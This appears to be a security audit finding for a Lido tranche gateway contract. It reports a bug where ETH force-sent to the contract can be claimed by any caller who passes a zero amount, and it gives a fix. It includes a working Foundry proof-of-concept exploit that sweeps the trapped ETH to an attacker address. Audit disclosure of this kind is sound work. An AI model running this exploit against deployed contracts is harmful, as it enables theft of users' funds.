### Title
Unprivileged users can steal ETH trapped in the Lido gateway - ([File: `contracts/strategies/lido/LidoCDOTrancheGateway.sol`](contracts/strategies/lido/LidoCDOTrancheGateway.sol))

### Summary
`LidoCDOTrancheGateway` uses the contract’s entire ETH balance—not the WETH amount supplied by the caller—when converting WETH into stETH. An unprivileged caller can pass `amount = 0` and receive tranche tokens backed by any ETH previously trapped or force-sent to the gateway. [1](#0-0) 

### Finding Description
The contract is intended to finish every transaction without holding funds. [2](#0-1) 

In the WETH branch, `_depositWithEthToken` withdraws only caller-supplied `_amount` but submits `address(this).balance` to Lido. [1](#0-0) 

The resulting stETH is deposited into the configured `IdleCDO`, and all minted tranche tokens are transferred to `msg.sender`. [3](#0-2) 

The receive hook prevents ordinary ETH transfers unless `msg.sender == wethToken`, but it cannot prevent ETH delivered through `selfdestruct` or another force-send mechanism. [4](#0-3) 

### Impact Explanation
Any ETH balance present before a WETH deposit is converted to stETH and credited to the next caller rather than to the contributor or a recovery address. A caller can deliberately use `amount = 0`, pay no WETH or ETH principal, and claim the gateway’s entire ETH balance as tranche shares. [5](#0-4) 

This violates the gateway invariant that it should not retain funds between transactions and converts stranded ETH into an MEV-style race won by the first caller. [2](#0-1) 

### Likelihood Explanation
The exploit requires a nonzero ETH balance to exist before the WETH-path call. Normal deposits are atomic and ordinary ETH transfers revert, so ETH does not accumulate through routine use. [4](#0-3) 

However, force-sending ETH through `selfdestruct` bypasses `receive`, and zero-amount WETH transfers do not provide a guard against the sweep. Once a balance exists, extraction is permissionless. [1](#0-0) 

### Recommendation
Use the requested `_amount`—not `address(this).balance`—when submitting ETH to stETH. If excess ETH must be supported, separate it explicitly and send it to a controlled recovery or treasury address instead of crediting it to the depositor. [6](#0-5) 

```solidity
amtToDeposit = _mintStEth(_amount);
```

A rescue function for already-trapped ETH can also be added, but it should be privileged or otherwise prevented from minting tranche shares to arbitrary callers. [7](#0-6) 

### Proof of Concept
The following Foundry fork test demonstrates the zero-cost claim. It uses mainnet WETH and stETH, mocks the IdleCDO response boundary, force-sends ETH to the gateway, and then has an attacker pass `amount = 0`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../../contracts/strategies/lido/LidoCDOTrancheGateway.sol";

contract TestTranche {
    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }
}

contract ForceEth {
    function destroy(address payable target) external payable {
        selfdestruct(target);
    }
}

contract LidoGatewayEthSweepTest is Test {
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    function test_zeroAmountWethCallSweepsForcedEth() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

        address fakeCdo = makeAddr("fakeCdo");
        TestTranche tranche = new TestTranche();

        vm.mockCall(
            fakeCdo,
            abi.encodeWithSelector(IdleCDO.AATranche.selector),
            abi.encode(address(tranche))
        );
        vm.mockCall(
            fakeCdo,
            abi.encodeWithSelector(IdleCDO.depositAA.selector),
            abi.encode(uint256(1 ether))
        );

        LidoCDOTrancheGateway gateway =
            new LidoCDOTrancheGateway(WETH, WSTETH, STETH, IdleCDO(fakeCdo), address(0));

        // ETH can be force-sent even though receive() only accepts WETH.
        ForceEth force = new ForceEth();
        force.destroy{value: 1 ether}(payable(address(gateway)));
        assertEq(address(gateway).balance, 1 ether);

        address attacker = makeAddr("attacker");
        vm.prank(attacker);

        // No WETH approval or balance is needed for amount = 0.
        uint256 minted = gateway.depositAAWithEthToken(WETH, 0);

        assertEq(minted, 1 ether);
        assertEq(address(gateway).balance, 0);
    }
}
```

The call chain is `depositAAWithEthToken(WETH, 0)` → WETH `transferFrom(..., 0)` → WETH `withdraw(0)` → `_mintStEth(address(this).balance)` → `depositAA` → tranche transfer to the attacker. [8](#0-7)

### Citations

**File:** contracts/strategies/lido/LidoCDOTrancheGateway.sol (L14-16)
```text
/// @notice Helper contract for Idle Lido Tranche. This contract converts ETH/WETH to stETH, and deposit those in IdleCDOTranche
/// @dev This contract should not have any funds at the end of each tx.
contract LidoCDOTrancheGateway {
```

**File:** contracts/strategies/lido/LidoCDOTrancheGateway.sol (L52-92)
```text
    function depositAAWithEthToken(address token, uint256 amount) public returns (uint256 minted) {
        return _depositWithEthToken(idleCDO.depositAA, idleCDO.AATranche(), token, msg.sender, msg.sender, amount);
    }

    function depositBBWithEthToken(address token, uint256 amount) public returns (uint256 minted) {
        return _depositWithEthToken(idleCDO.depositBB, idleCDO.BBTranche(), token, msg.sender, msg.sender, amount);
    }

    function _depositWithEthToken(
        function(uint256) external returns (uint256) _depositFn,
        address _tranche,
        address _token,
        address _from,
        address _onBehalfOf,
        uint256 _amount
    ) internal returns (uint256 minted) {
        uint amtToDeposit;
        if (_token == wethToken) {
            IERC20(wethToken).safeTransferFrom(_from, address(this), _amount);
            IWETH(wethToken).withdraw(_amount);
            // mint stETH
            amtToDeposit = _mintStEth(address(this).balance);
        } else if (_token == stETH) {
            amtToDeposit = _amount;
            IERC20(stETH).safeTransferFrom(_from, address(this), _amount);
        } else {
            revert("invalid-token-address");
        }
        // deposit stETH to IdleCDO and mint tranche
        IERC20(stETH).safeApprove(address(idleCDO), amtToDeposit);
        minted = _depositBehalf(_depositFn, _tranche, _onBehalfOf, amtToDeposit);
    }

    function _depositBehalf(
        function(uint256) external returns (uint256) _depositFn,
        address _tranche,
        address _onBehalfOf,
        uint256 _amount
    ) private returns (uint256 minted) {
        minted = _depositFn(_amount);
        IERC20(_tranche).transfer(_onBehalfOf, minted);
```

**File:** contracts/strategies/lido/LidoCDOTrancheGateway.sol (L99-101)
```text
    receive() external payable {
        require(msg.sender == wethToken, "only-weth");
    }
```
